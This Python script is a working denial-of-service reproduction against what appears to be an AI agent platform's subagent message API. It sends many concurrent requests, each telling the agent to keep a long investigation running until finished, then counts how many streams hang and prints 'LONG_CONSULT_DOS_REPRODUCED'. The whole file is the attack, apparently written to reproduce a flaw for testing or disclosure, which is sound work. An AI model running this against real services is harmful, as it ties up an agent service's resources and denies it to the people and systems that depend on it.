import concurrent.futures
import datetime as dt
import json
import sys
import time
import urllib.request


target = sys.argv[1].rstrip("/")
connection = sys.argv[2] if len(sys.argv) > 2 else "slow-codex"
concurrency = int(sys.argv[3]) if len(sys.argv) > 3 else 16
requests = int(sys.argv[4]) if len(sys.argv) > 4 else 16
timeout = float(sys.argv[5]) if len(sys.argv) > 5 else 6


def now():
    return dt.datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def consult_once(i):
    payload = {
        "chat_session_id": f"subagent-long-consult-{int(time.time())}-{i}",
        "message": "Please do a long-running investigation and keep working until finished.",
    }
    req = urllib.request.Request(
        f"{target}/api/v1/subagents/connections/{connection}/message",
        data=json.dumps(payload).encode("utf-8"),
        method="POST",
        headers={"Content-Type": "application/json"},
    )
    started = time.time()
    saw_event = False
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            while True:
                line = resp.readline()
                if not line:
                    break
                saw_event = True
                text = line.decode("utf-8", errors="replace")
                if '"done": true' in text or '"done":true' in text:
                    return False, round(time.time() - started, 3), "completed unexpectedly"
    except Exception as exc:
        return True, round(time.time() - started, 3), f"{type(exc).__name__}({exc}) saw_event={saw_event}"
    return True, round(time.time() - started, 3), f"stream ended without done saw_event={saw_event}"


print(
    f"[{now()}] attack_start endpoint=/api/v1/subagents/connections/{connection}/message "
    f"requests={requests} concurrency={concurrency} timeout={timeout}s",
    flush=True,
)

hung = 0
with concurrent.futures.ThreadPoolExecutor(max_workers=concurrency) as pool:
    futures = [pool.submit(consult_once, i) for i in range(requests)]
    for future in concurrent.futures.as_completed(futures):
        is_hung, latency, detail = future.result()
        if is_hung:
            hung += 1
        print(
            f"[{now()}] completed={not is_hung} latency={latency:.3f}s "
            f"hung={hung} detail={detail}",
            flush=True,
        )

if hung == requests:
    print(f"[{now()}] RESULT=LONG_CONSULT_DOS_REPRODUCED hung={hung}/{requests}", flush=True)
else:
    print(f"[{now()}] RESULT=PARTIAL_REPRODUCTION hung={hung}/{requests}", flush=True)
